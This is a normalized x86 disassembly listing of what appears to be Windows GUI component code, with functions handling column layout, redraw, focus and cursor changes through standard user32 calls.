sub_436ad4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x22c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x22c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x230 ]
call sub_4566bc
xor edx edx
mov eax ebx
call sub_436a80
pop esi
pop ebx
retn
mov edx [ ebx + 0x230 ]
call sub_456700
mov edx ebx
mov eax [ ebx + 0x22c ]
call sub_4207e4
mov eax [ ebx + 0x22c ]
call sub_455d2c
mov edx eax
mov eax ebx
call sub_436a80
pop esi
pop ebx
retn
sub_436b54
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_447fc4
test [ edi + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp esi [ edi + 0x22c ]
jne r-xdata
mov edx esi
mov eax [ edi + 0x210 ]
call sub_43617c
test eax eax
je r-xdata
xor edx edx
mov eax edi
call sub_436ad4
xor edx edx
mov [ eax + 0x28 ] edx
jmp r-xdata
sub_436bb8
push ebx
mov ebx eax
mov eax [ ebx + 0x224 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
call sub_447d88
pop ebx
retn
mov eax [ ebx + 0x224 ]
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_436be0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x224 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x224 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebx + 0x210 ]
call sub_419080
mov edi eax
dec edi
test edi edi
jl r-xdata
mov dl 0x1
mov eax [ ebx + 0x224 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
inc edi
xor ebp ebp
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x85
push 0x0
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call RedrawWindow
mov edx ebp
mov eax [ ebx + 0x210 ]
call sub_4361b0
mov si 0xfffc
call sub_40348c
inc ebp
dec edi
jne r-xdata
sub_436c78
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x235 ] 0x0
je r-xdata
cmp [ ebx + 0x235 ] 0x0
jne r-xdata
mov eax ebx
call sub_4366d4
test al al
je r-xdata
mov eax ebx
call sub_4366d4
sub al 0x3
jb r-xdata
mov al 0x1
pop ebx
retn
add al 0xfd
sub al 0x2
jb r-xdata
sub_436cb8
push ebx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_436c78
test al al
je r-xdata
mov al 0x1
pop ebx
retn
sub_436cec
push ebx
mov ebx eax
cmp dl [ ebx + 0x235 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x235 ] dl
mov eax ebx
call sub_44c87c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
push 0x405
push 0x0
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call RedrawWindow
sub_436d30
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43704e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437055
lea eax [ ebp - 0x1c ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ ebp - 0xc ]
call sub_4361b0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x28 ]
test eax eax
je r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov si 0xffb5
call sub_40348c
mov [ ebp - 0x15 ] al
mov eax [ ebp - 0x4 ]
call sub_436c68
xor eax eax
push ebp
push sub_436dcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_436c70
retn
lea eax [ ebp - 0x70 ]
xor ecx ecx
mov edx 0x50
call sub_402ca4
call sub_4361f4
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_435ecc
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x24 ]
call sub_4232e0
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_4232e0
mov [ ebp - 0x60 ] eax
jmp r-xdata
mov [ ebp - 0x6c ] 0x1cb
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x2d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax + 0xd ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
movzx edx [ edx + 0xe ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
movzx edx [ edx + 0xc ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
movzx edx [ edx + 0x18 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x68 ] eax
call sub_4341a8
cmp eax 0x40047
jl r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x3c ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x224 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xe ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x20 ] 0x0
jg r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x28 ]
call sub_44f2dc
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or [ ebp - 0x68 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x6c ]
or eax 0x10
or eax 0x20
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
add [ ebp - 0x4c ] 0x4
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x235 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x234 ]
or dl al
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_449ca8
test eax eax
setne [ ebp - 0xd ]
cmp [ ebp - 0x15 ] 0x0
je r-xdata
test al al
je r-xdata
mov al 0x1
call sub_4341a8
cmp eax 0x40048
jge r-xdata
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x28 ]
mov eax ebx
call sub_44f2dc
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
mov edx [ edx + 0x34 ]
call sub_4040a0
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_44f2dc
push eax
call SetFocus
mov eax [ ebp - 0x1c ]
call sub_4044c8
mov [ ebp - 0x5c ] eax
or [ ebp - 0x6c ] 0x4
sub_437060
push ebp
mov ebp esp
add esp 0xffffff84
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
jne r-xdata
call sub_4361f4
mov edx eax
lea eax [ ebp - 0x6a ]
xor ecx ecx
call sub_402ca4
call sub_4361f4
mov [ ebp - 0x6a ] eax
mov [ ebp - 0x66 ] 0x141
mov eax [ ebp - 0x4 ]
call sub_436c68
xor eax eax
push ebp
push sub_43728f
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x1
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4484f8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_44853c
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x235 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x210 ]
cmp esi [ edi + 0x1c ]
jae r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_436c70
retn
mov eax edi
call sub_419080
cmp ebx eax
jl r-xdata
lea eax [ ebp - 0x6a ]
push eax
mov ecx esi
mov edx 0x405
mov eax [ ebp - 0x4 ]
call sub_449ca8
test eax eax
je r-xdata
inc esi
inc ebx
cmp [ ebp - 0x36 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_4341a8
cmp eax 0x40047
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_419080
mov edi eax
dec edi
sub edi ebx
jl r-xdata
mov eax [ ebp - 0x3e ]
mov [ ebp - 0xc ] eax
test [ ebp - 0x62 ] 0x1
setne [ ebp - 0x19 ]
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x7a ]
push eax
mov ecx esi
mov edx 0x409
mov eax [ ebp - 0x4 ]
call sub_449ca8
test eax eax
je r-xdata
inc edi
mov eax [ ebp - 0x3e ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x72 ]
sub eax [ ebp - 0x7a ]
mov [ ebp - 0x3e ] eax
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jbe r-xdata
mov eax [ ebp - 0x3e ]
add eax [ ebp - 0x18 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx ebx
call sub_4361b0
call sub_435ecc
test al al
jne r-xdata
mov eax [ ebp - 0x36 ]
mov [ eax + 0x40 ] esi
mov eax [ ebp - 0x3e ]
mov [ ebp - 0x14 ] eax
mov eax esi
or eax 0x80000000
mov edx [ ebp - 0x36 ]
mov [ edx + 0x40 ] eax
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov dl [ ebp - 0x19 ]
mov eax [ ebp - 0x36 ]
call sub_435f94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx ebx
call sub_4361b0
push eax
mov eax [ ebp - 0x36 ]
call sub_418cf0
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx ebx
mov eax [ ebp - 0x36 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x36 ]
call sub_43611c
mov eax [ ebp - 0x36 ]
call sub_418cf0
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x36 ]
mov al [ eax + 0xd ]
cmp al [ ebp - 0x19 ]
setne [ ebp - 0x1a ]
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov eax [ ebp - 0x36 ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0xc ]
je r-xdata
sub_4372a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4361b0
mov eax [ eax + 0x40 ]
and eax 0x7fffffff
push eax
mov ecx esi
mov edx 0x406
mov eax ebx
call sub_436d30
sub_4372e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_436c68
call GetDesktopWindow
push eax
call LockWindowUpdate
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43742f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0x40c
mov eax [ ebp - 0x4 ]
call sub_449ca8
mov edi eax
mov esi edi
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
inc esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_419080
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_419080
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
xor ecx ecx
mov edx 0x402
mov eax [ ebp - 0x4 ]
call sub_449ca8
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x22c ]
test ebx ebx
je r-xdata
push 0x0
mov ecx ebx
mov edx 0x401
mov eax [ ebp - 0x4 ]
call sub_436d30
dec ebx
cmp ebx 0xffffffff
jne r-xdata
inc esi
xor ebx ebx
push 0x0
xor ecx ecx
mov edx 0x40c
mov eax [ ebp - 0x4 ]
call sub_449ca8
cmp edi eax
jle r-xdata
mov eax ebx
call sub_455d2c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_436a80
push 0xffffffff
mov ecx ebx
mov edx 0x401
mov eax [ ebp - 0x4 ]
call sub_436d30
inc ebx
dec esi
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
call sub_436c70
retn
push 0x0
call LockWindowUpdate
sub_437478
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43773c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_419080
mov esi eax
dec esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x228 ] 0x0
je r-xdata
mov [ ebp - 0xc ] ebx
cmp esi [ ebp - 0xc ]
jle r-xdata
xor ebx ebx
jmp r-xdata
mov esi [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
sub esi ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edi [ ebp - 0xc ]
inc edi
mov edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4361b0
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4361b0
call sub_435ecc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437743
lea eax [ ebp - 0x1c ]
call sub_404008
retn
inc esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx ebx
call sub_4361b0
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx ebx
call sub_4361b0
call sub_435ecc
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4361b0
test [ eax + 0x43 ] 0x80
jne r-xdata
inc [ ebp - 0xc ]
cmp esi [ ebp - 0xc ]
jg r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_435ecc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx ebx
call sub_4361b0
test [ eax + 0x43 ] 0x80
jne r-xdata
dec ebx
test ebx ebx
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x20 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub [ ebp - 0x10 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ ebp - 0xc ]
call sub_4361b0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x234 ]
or dl al
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
test eax eax
je r-xdata
test al al
je r-xdata
mov al 0x1
add [ ebp - 0x10 ] 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov edx [ ebp - 0x18 ]
cmp [ edx + 0x14 ] 0x0
jl r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov edx [ edx + 0x34 ]
call sub_4040a0
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x235 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x235 ] 0x0
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_4376a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
call sub_4476d0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x24 ]
call sub_4247d4
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x24 ]
call sub_424714
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_403290
retn
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
sub_437750
push ebx
push esi
push edi
push ebp
add esp 0xffffff84
mov ebx ecx
mov edi edx
mov esi eax
call sub_4341a8
cmp eax 0x40047
jl r-xdata
mov eax [ esi + 0x210 ]
cmp [ eax + 0x1c ] 0x0
jbe r-xdata
mov eax [ edi ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x1c ]
push eax
xor ecx ecx
mov edx 0x408
mov eax esi
call sub_449ca8
mov edi eax
call sub_4361f4
mov edx eax
lea eax [ esp + 0x2c ]
xor ecx ecx
call sub_402ca4
call sub_4361f4
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x100
lea eax [ esp + 0x2c ]
push eax
mov ecx edi
mov edx 0x405
mov eax esi
call sub_449ca8
test eax eax
je r-xdata
mov eax 0x3
xor eax eax
mov [ ebx ] eax
cmp [ esi + 0x235 ] 0x0
je r-xdata
xor eax eax
mov [ ebx ] eax
cmp [ esp + 0x60 ] 0x0
je r-xdata
mov eax [ edi ]
mov [ esp ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ esp ] eax
mov eax [ edi ]
mov [ esp + 0x4 ] eax
jmp r-xdata
add esp 0x7c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x60 ]
mov [ ebx ] eax
jmp r-xdata
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] 0x2
jmp r-xdata
xor ebp ebp
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
cmp [ esi + 0x214 ] 0x1
jne r-xdata
mov eax [ esp + 0x24 ]
jmp r-xdata
inc eax
mov [ esp + 0x18 ] eax
xor edi edi
mov eax [ esi + 0x210 ]
call sub_419080
dec eax
test eax eax
jl r-xdata
mov eax [ ebx ]
test [ eax + 0x40 ] 0x7fffffff
je r-xdata
mov eax [ ebx ]
call sub_435ecc
test al al
je r-xdata
xor ebp ebp
mov eax [ ebx ]
test [ eax + 0x40 ] 0x7fffffff
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
inc edi
dec [ esp + 0x18 ]
jne r-xdata
mov edx edi
mov eax esi
call sub_437478
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
add eax [ esp + 0x14 ]
add [ esp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + 0x43 ] 0x80
je r-xdata
mov edx edi
mov eax [ esi + 0x210 ]
call sub_4361b0
mov [ ebx ] eax
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
add eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
cmp ebp [ esp ]
jg r-xdata
add ebp [ esp + 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
add eax ebp
cmp eax [ esp ]
jl r-xdata
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0x8 ]
jl r-xdata
mov eax [ esp + 0x8 ]
add eax [ esp + 0x10 ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
cmp [ esi + 0x229 ] 0x0
je r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4367b8
add eax ebp
cmp eax [ esp ]
jl r-xdata
mov eax [ ebx ]
test [ eax + 0x40 ] 0x7fffffff
jle r-xdata
lea eax [ ebp + 0x8 ]
cmp eax [ esp ]
jl r-xdata
mov eax 0x2
jmp r-xdata
call sub_4341a8
cmp eax 0x40047
jl r-xdata
mov eax 0x4
jmp r-xdata
add ebp 0x5
cmp ebp [ esp ]
jge r-xdata
sub_437970
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x1401
mov eax esi
call sub_44f2dc
push eax
call PostMessageA
pop esi
retn
sub_437994
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43936c
call sub_43944c
test al al
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov eax ebx
call sub_436cb8
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d730
mov eax ebx
call sub_436c78
test al al
je r-xdata
mov eax [ ebx + 0x210 ]
call sub_419080
test eax eax
jne r-xdata
sub_4379e4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x8 ]
call sub_406b4c
lea edx [ esp + 0x4 ]
mov ecx esp
mov eax ebx
call sub_437750
test al 0x3
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a178
add esp 0xc
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
mov [ ebx + 0x236 ] eax
sub_437a24
push ebx
test [ eax + 0x1c ] 0x10
jne r-xdata
movsx ecx [ eax + 0x236 ]
movsx ebx [ edx + 0x8 ]
dec ebx
cmp ecx ebx
jl r-xdata
cmp [ eax + 0x215 ] 0x0
jne r-xdata
call sub_44a48c
pop ebx
retn
movsx ecx [ eax + 0x236 ]
movsx ebx [ edx + 0x8 ]
inc ebx
cmp ecx ebx
jg r-xdata
movsx ecx [ eax + 0x238 ]
movsx ebx [ edx + 0xa ]
dec ebx
cmp ecx ebx
jl r-xdata
movsx ecx [ eax + 0x238 ]
movsx ebx [ edx + 0xa ]
inc ebx
cmp ecx ebx
jle r-xdata
xor edx edx
call sub_448d2c
pop ebx
retn
sub_437a84
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax esi
call sub_44f2dc
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_437aa8
push ebx
push esi
add esp 0xfffffff4
mov ebx edx
mov esi eax
mov eax esi
call sub_44f2dc
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx ebx
mov eax esi
call sub_44d910
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
mov [ ebx + 0xc ] 0x1
call GetMessagePos
mov edx eax
and edx 0xffff
mov [ esp ] edx
shr eax 0x10
mov [ esp + 0x4 ] eax
push esp
mov eax [ ebx + 0x4 ]
push eax
call ScreenToClient
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_437750
test al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46657c
push eax
call SetCursor
jmp r-xdata
cmp eax 0x2
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
cmp [ esi + 0x235 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xffffffeb
call sub_46657c
push eax
call SetCursor
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff7
call sub_46657c
push eax
call SetCursor
jmp r-xdata
